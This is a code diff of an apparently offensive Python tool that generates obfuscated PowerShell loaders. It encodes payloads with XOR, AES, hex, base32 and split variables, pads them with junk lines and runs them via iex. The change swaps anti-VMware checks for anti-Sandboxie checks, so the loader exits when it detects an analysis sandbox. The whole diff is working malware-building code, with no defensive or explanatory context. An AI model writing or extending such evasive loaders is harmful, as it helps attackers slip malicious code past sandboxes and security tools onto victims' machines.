@@ -23,12 +23,11 @@ junk_vars = [
     "$counter = 0"
 ]
 
-anti_vmware = """
-# Anti-VMware detection
-if ((Get-WmiObject Win32_ComputerSystem).Manufacturer -like "*VMware*") { exit }
-if ((Get-WmiObject Win32_BIOS).SerialNumber -like "*VMware*") { exit }
-if (Test-Path "C:\\Program Files\\VMware") { exit }
-if ($env:USERNAME -like "*vmware*") { exit }
+anti_sandbox = """
+# Anti-Sandboxie detection
+if (Get-Process -Name "sandboxie*" -ErrorAction SilentlyContinue) { exit }
+if (Test-Path "C:\\sandboxie") { exit }
+if ($env:USERNAME -like "*sandbox*") { exit }
 """
 
 def add_junk(code_lines):
@@ -52,7 +51,7 @@ def css_obfuscate(payload):
         parts.append(f"$v{i}='{chunk}'")
         i += 1
         pos += len(chunk)
-    code = anti_vmware + "\n".join(parts) + f"\n iex ({' + '.join(f'$v{j}' for j in range(1, i))})"
+    code = anti_sandbox + "\n".join(parts) + f"\n iex ({' + '.join(f'$v{j}' for j in range(1, i))})"
     return add_junk(code.splitlines())
 
 def xor_encrypt(payload):
@@ -61,7 +60,7 @@ def xor_encrypt(payload):
     xor_bytes = bytes(b ^ key[i % len(key)] for i, b in enumerate(payload_bytes))
     xor_b64 = base64.b64encode(xor_bytes).decode()
     key_str = ','.join(str(b) for b in key)
-    code = anti_vmware + f"""
+    code = anti_sandbox + f"""
 $key = [byte[]]({key_str})
 $data = [Convert]::FromBase64String('{xor_b64}')
 for($i=0;$i -lt $data.Length;$i++){{ $data[$i] = $data[$i] -bxor $key[$i % {len(key)}] }}
@@ -84,7 +83,7 @@ def aes_encrypt(payload):
         enc_b64 = base64.b64encode(encrypted).decode()
         key_str = ','.join(str(b) for b in key)
         iv_str = ','.join(str(b) for b in iv)
-        code = anti_vmware + f"""
+        code = anti_sandbox + f"""
 $key = [byte[]]({key_str})
 $iv = [byte[]]({iv_str})
 $enc = [Convert]::FromBase64String('{enc_b64}')
@@ -98,12 +97,12 @@ iex ([Text.Encoding]::Unicode.GetString($dec).TrimEnd("`0"))
         return payload
 
 def base64_encode(payload):
-    code = anti_vmware + payload
+    code = anti_sandbox + payload
     return add_junk(code.splitlines())
 
 def hex_encode(payload):
     hex_data = binascii.hexlify(payload.encode('utf-16le')).decode()
-    code = anti_vmware + f"""
+    code = anti_sandbox + f"""
 $h = '{hex_data}'
 $b = for($i=0;$i -lt $h.Length;$i+=2){{ [Convert]::ToByte($h.Substring($i,2),16) }}
 iex ([Text.Encoding]::Unicode.GetString($b))
@@ -112,7 +111,7 @@ iex ([Text.Encoding]::Unicode.GetString($b))
 
 def base32_encode(payload):
     b32_data = base64.b32encode(payload.encode('utf-16le')).decode()
-    code = anti_vmware + f"""
+    code = anti_sandbox + f"""
 $b32 = '{b32_data}'
 $map = @{{'A'=0;'B'=1;'C'=2;'D'=3;'E'=4;'F'=5;'G'=6;'H'=7;'I'=8;'J'=9;'K'=10;'L'=11;'M'=12;'N'=13;'O'=14;'P'=15;'Q'=16;'R'=17;'S'=18;'T'=19;'U'=20;'V'=21;'W'=22;'X'=23;'Y'=24;'Z'=25;'2'=26;'3'=27;'4'=28;'5'=29;'6'=30;'7'=31}}
 $bytes = [byte[]]::new([math]::Ceiling($b32.Length*5/8))
